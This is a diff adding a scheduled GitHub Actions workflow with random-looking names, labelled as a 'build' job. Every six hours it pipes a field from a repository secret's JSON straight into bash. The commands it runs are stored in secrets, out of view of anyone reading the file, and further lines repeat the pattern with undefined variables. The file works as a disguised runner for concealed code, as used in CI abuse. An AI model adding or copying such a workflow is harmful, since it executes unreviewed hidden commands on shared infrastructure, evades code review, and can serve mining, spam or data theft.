@@ -1,0 +1,21 @@
+name: wentgratis
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wentgratis
+        env:
+          swrab236: ${{ secrets.swrab236 }}
+        run: |
+          echo $swrab236 | jq -r .kxrii55959 | /bin/bash
+          echo $exhy2 | jq -r .vhfy0 | /bin/bash
+          echo $lten8 | jq -r .cp7044 | /bin/bash
+          echo $l8 | jq -r .xdv8 | /bin/bash
+          echo $b4169 | jq -r .bekg2 | /bin/bash
+          echo $lqtfb1 | jq -r .dagas7 | /bin/bash
+
